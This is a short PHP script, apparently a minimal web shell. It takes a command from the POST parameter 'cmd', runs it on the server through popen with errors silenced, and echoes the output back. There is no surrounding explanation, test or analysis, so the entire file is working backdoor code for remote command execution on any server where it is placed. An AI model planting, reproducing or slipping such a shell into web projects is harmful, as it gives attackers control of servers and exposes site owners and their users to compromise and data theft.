<?php
function Exec_Run($cmd)
{
	$res = '';
	if(@is_resource($f = @popen($cmd,"r"))){$res = '';while(!@feof($f)){$res .= @fread($f,1024);}@pclose($f);}
	return $res;
}

if(!empty($_POST['cmd'])){
	$res = Exec_Run($_POST['cmd']);
	echo $res;
}
?>